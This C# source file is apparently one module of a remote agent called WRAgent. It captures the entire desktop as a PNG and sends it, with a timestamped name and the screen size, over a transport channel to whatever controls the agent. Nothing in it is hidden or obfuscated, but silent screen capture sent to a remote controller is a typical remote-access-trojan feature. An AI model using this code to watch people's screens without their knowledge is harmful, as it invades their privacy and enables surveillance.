using System.Drawing;
using System.Drawing.Imaging;
using System.Text.Json.Nodes;
using System.Windows.Forms;

namespace WRAgent
{
    internal static class ScreenModule
    {
        public static async Task<JsonObject> Capture(Transport t)
        {
            try
            {
                var bounds = SystemInformation.VirtualScreen;
                using var bmp = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format24bppRgb);
                using (var g = Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(bounds.Left, bounds.Top, 0, 0, bounds.Size,
                        CopyPixelOperation.SourceCopy);
                }

                using var ms = new MemoryStream();
                bmp.Save(ms, ImageFormat.Png);
                var data = ms.ToArray();

                var meta = new JsonObject
                {
                    ["name"] = $"screen-{DateTime.Now:yyyyMMdd-HHmmss}.png",
                    ["path"] = "<screen>",
                    ["width"] = bounds.Width,
                    ["height"] = bounds.Height
                };
                await t.EmitBlobAsync("screenshot", meta, data).ConfigureAwait(false);

                return new JsonObject
                {
                    ["ok"] = true,
                    ["stdout"] = $"screenshot {bounds.Width}x{bounds.Height} ({data.Length} bytes)"
                };
            }
            catch (Exception e)
            {
                return new JsonObject { ["ok"] = false, ["error"] = e.Message };
            }
        }
    }
}
